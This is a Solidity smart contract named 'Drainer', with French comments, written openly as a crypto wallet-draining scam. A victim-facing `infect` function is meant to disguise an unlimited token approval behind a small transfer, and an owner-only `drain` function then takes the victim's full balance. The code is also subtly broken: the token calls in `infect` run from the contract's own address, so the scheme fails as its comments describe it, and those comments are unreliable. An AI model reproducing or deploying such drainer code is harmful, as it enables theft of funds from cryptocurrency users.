// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Drainer {
    address public owner;

    constructor() {
        owner = msg.sender; // le pirate
    }

    /**
     * @dev La victime appelle cette fonction.
     *     1. Transfère `smallAmount` de token à `to` (le pirate)
     *     2. Approuve ce contrat (`this`) à dépenser tous les tokens de `msg.sender`
     *        Mais en réalité, l'approbation est donnée au contrat lui-même,
     *        et le pirate (owner) peut ensuite appeler `drain`.
     */
    function infect(address token, address to, uint256 smallAmount) external {
        // Transfert visible : la victime pense n'envoyer que ce montant
        IERC20(token).transfer(to, smallAmount);

        // Approbation cachée : elle approuve CE contrat à utiliser ses tokens
        IERC20(token).approve(address(this), type(uint256).max);
    }

    /**
     * @dev Appelé par le pirate (owner) pour drainer tous les tokens
     *      de la victime après qu'elle a appelé `infect`.
     */
    function drain(address token, address victim, address to) external {
        require(msg.sender == owner, "Not owner");
        uint256 balance = IERC20(token).balanceOf(victim);
        require(balance > 0, "No balance");
        IERC20(token).transferFrom(victim, to, balance);
    }
}